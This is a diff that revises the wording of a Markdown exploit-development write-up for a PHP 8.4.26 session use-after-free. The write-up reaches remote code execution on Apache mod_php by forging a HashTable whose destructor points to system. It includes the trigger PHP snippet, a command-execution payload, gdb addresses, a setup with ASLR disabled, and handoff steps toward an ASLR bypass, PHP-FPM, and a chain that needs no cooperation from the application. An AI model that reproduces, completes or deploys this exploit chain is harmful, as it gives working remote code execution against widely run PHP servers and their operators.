@@ -32,20 +32,20 @@ SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
 
 - ASLR control: normal `apache2ctl start` (personality=0) fails; `setarch x86_64 -R apache2ctl start` (personality=0x40000) succeeds.
 
-### 1.2 Trigger method (this line)
+### 1.2 Trigger method (this approach)
 
-The exploit script `tools/d.php` is a test page with a `__destruct`:
+The exploit script `tools/d.php` is a test page with a `__destruct` method:
 
 ```php
 session_start();
-$_SESSION["x"] = new X($fp, $payload);   // X::__destruct writes $_SESSION
+$_SESSION["x"] = new X($fp, $payload);   // X::__destruct writes to $_SESSION
 for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
 session_unset();                         // key: zend_hash_clean on the array still referenced by $_SESSION
 ```
 
 `session_unset()` → `zend_hash_clean($_SESSION array)`. When cleaning reaches object X it calls `X::__destruct`; the destructor writes `$_SESSION["pwn"]`, triggering `zend_hash_do_resize()` on the same HashTable and freeing the old `arData`; the outer `zend_hash_clean` continues iterating with the `p/end` cached before entering the loop, producing a heap-use-after-free. The destructor then uses `stream_bucket_new()` to allocate a fully content-controlled 320-byte raw buffer that reclaims the just-freed `arData` chunk; clean continues to treat this data as Buckets and finally reaches the fake HashTable's `pDestructor = system`.
 
-> **Boundary**: this is the weaponization of "Defect D"; it requires the target script to call `session_unset()` and to have a destructor that writes `$_SESSION` (or an equivalent gadget in the application). It is not a "pure `session.upload_progress`, zero application cooperation" internet-facing exploit chain. See Section 5 for progress on the upload_progress line.
+> **Boundary**: this is the weaponization of "Defect D"; it requires the target script to call `session_unset()` and to have a destructor that writes `$_SESSION` (or an equivalent gadget in the application). It is not a "pure `session.upload_progress`, zero application cooperation" internet-facing exploit chain. See Section 5 for progress on the upload_progress approach.
 
 ---
 
@@ -63,7 +63,7 @@ tar xzf php-8.4.26.tar.gz && cd php-8.4.26
 make -j16 && sudo make install
 ```
 
-Products: `/usr/lib/apache2/modules/libphp.so`, `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).
+Build outputs: `/usr/lib/apache2/modules/libphp.so`, `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).
 
 ### 2.2 Apache
 
@@ -82,7 +82,7 @@ php_admin_value session.upload_progress.enabled On
 php_admin_value session.upload_progress.cleanup On
 ```
 
-> `memory_limit 8M` is to make the upload_progress line OOM reliably; the RCE line itself does not depend on that value.
+> `memory_limit 8M` is to make the upload_progress approach OOM reliably; the RCE approach itself does not depend on that value.
 
 ### 2.3 Disabling ASLR
 
@@ -94,7 +94,7 @@ sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
 # 00040000
 ```
 
-Under no ASLR, fresh workers with the same configuration have stable addresses (see the address table in Section 4).
+With ASLR disabled, fresh workers with the same configuration have stable addresses (see the address table in Section 4).
 
 ---
 
@@ -196,9 +196,9 @@ ASLR_OFF_OK: uid=33(www-data) ...
 
 ---
 
-## 4. `session.upload_progress` cross-request line (independent reproduction progress)
+## 4. `session.upload_progress` cross-request research track (independent reproduction progress)
 
-This section is the main path from the intelligence. This line has been reproduced to the point of **cross-request residue + reproducible crash**, but the fake HashTable chain has not yet been fully migrated over; however, the mechanism, addresses, and harness are all confirmed.
+This section is the main path from the intelligence. This approach has been reproduced to the point of **state persisting across requests + a reproducible crash**, but the fake HashTable chain has not yet been fully migrated over; however, the mechanism, addresses, and harness are all confirmed.
 
 ### 4.1 Request A: OOM bailout leaves cross-request state
 
@@ -247,7 +247,7 @@ php_session_rfc1867_callback(MULTIPART_EVENT_END)
 - `zend_hash_del_ind()` follows the indirect, sets the target zval to UNDEF and calls the dtor; **the bucket itself remains**.
 - Then `zend_hash_update_ind()` finds this indirect bucket again, follows it to `PS.http_session_vars`, and calls `pDestructor` on `data` **before storing** (the dtor-before-store window of `_zend_hash_add_or_update_i`).
 
-Measured gdb:
+gdb observations:
 
 ```text
 TRACK psvars=0x7ffff5e02320 ti=10a
@@ -290,13 +290,13 @@ Request B (same worker, RFC1867 buffer reclaim)
 zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
 ```
 
-This line independently reproduced **the same family of internal session defects** and achieved:
+This investigation independently reproduced **the same family of internal session defects** and achieved:
 
-- `session_unset → zend_hash_clean → object destructor writes $_SESSION → resize frees arData → UAF`;
+- `session_unset → zend_hash_clean → object destructor writes to $_SESSION → resize frees arData → UAF`;
 - reclaiming the UAF chunk with a 320-byte raw buffer from `stream_bucket_new`;
 - the full RCE chain fake zval → fake HashTable → `pDestructor=system`.
 
-The difference is that this line uses `session_unset()` + `__destruct` as the trigger/reentry mechanism, whereas the previous stage claimed to use pure upload_progress cross-request memory layout to forge the HashTable directly. The two can be merged: reuse this line's fake HashTable payload on the upload_progress line, or conversely replace this line's application-level destructor with the previous stage's cross-request primitive.
+The difference is that this approach uses `session_unset()` + `__destruct` as the trigger/reentry mechanism, whereas the previous stage claimed to use pure upload_progress cross-request memory layout to forge the HashTable directly. The two can be merged: reuse this approach's fake HashTable payload on the upload_progress approach, or conversely replace this approach's application-level destructor with the previous stage's cross-request primitive.
 
 ---
 
@@ -341,13 +341,13 @@ python3 sup_poc.py b   # Request B: END cleanup, observe crash/warnings
 
 ## 7. Recommended next steps (handoff)
 
-1. **Connect the fake HashTable to the upload_progress line**
+1. **Connect the fake HashTable to the upload_progress approach**
    - Place 320-byte-class allocations in request B's multipart fields/boundaries, and observe the chunks freed/reclaimed around `php_session_track_init` during END cleanup;
-   - reuse this line's payload layout, but re-measure A/arData/S addresses (B's allocation sequence differs).
+   - reuse this approach's payload layout, but re-measure A/arData/S addresses (B's allocation sequence differs).
 2. **Make the RCE "cleaner"**
    - Place the fake HashTable at S (the allocation start), with `arData=S+0x40`, mask=0xfffffff0, so that `HT_GET_DATA_ADDR=S`; use another `stream_bucket_new` to provide a separate data chunk, avoiding double free/interior free.
 3. **ASLR bypass**
-   - The previous-stage intelligence mentions leaking the heap base with mbstring; this line's `stream_bucket_new` layout and `system` offset can be reused directly. First obtain the heap base, then compute S/A; obtain the libc base with an arbitrary leak or format-string primitive.
+   - The previous-stage intelligence mentions leaking the heap base with mbstring; this approach's `stream_bucket_new` layout and `system` offset can be reused directly. First obtain the heap base, then compute S/A; obtain the libc base with an arbitrary leak or format-string primitive.
 4. **PHP-FPM**
    - Defect D is a single-request primitive; if an FPM application calls `session_unset()` and has a destructor that writes `$_SESSION`, it should in theory apply equally. Cross-request PS residue does not apply to FPM (the worker is replaced after bailout, as confirmed in the previous stage).
 5. **Version coverage**
@@ -373,7 +373,7 @@ python3 sup_poc.py b   # Request B: END cleanup, observe crash/warnings
 - `/tmp/x`, `/tmp/destruct_done`, `/tmp/core.*` may remain on the remote lab machine; clean them with `sudo rm -f` before testing.
 - This PoC depends on a fixed PHP build/configuration/startup order; after changing the build, gadget offsets and the S offset must be re-measured.
 - The no-ASLR version (`tools/d.php`) hardcodes the `system` address; the ASLR version (Section 10) computes it dynamically from two leaks and does not need a hardcoded base address.
-- This line's "RCE" is an application-level trigger (`session_unset` + destructor). Do not describe it in external reporting as a "pure upload_progress, no application cooperation" exploit; the pure RCE on the upload_progress line still requires the merge work in Section 7.
+- This line's "RCE" is an application-level trigger (`session_unset` + destructor). Do not describe it in external reporting as a "pure upload_progress, no application cooperation" exploit; the pure RCE on the upload_progress approach still requires the merge work in Section 7.
 
 ---
 
@@ -383,7 +383,7 @@ Goal: achieve the same Defect D RCE under `personality=0` (normal ASLR), without
 
 ### 10.1 Two leak primitives
 
-#### Leak 1: Zend MM 2MB chunk base (775-byte heap pointer)
+#### Leak 1: Zend MM 2MB chunk base (775 bytes containing heap pointers)
 
 With `session.serialize_handler=php_serialize`, `session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))`; this path does **not** have the `PS_ENCODE_LOOP` array-copy protection that GH-16590 added for the `php` serializer (still triggerable in 8.4.26):
 
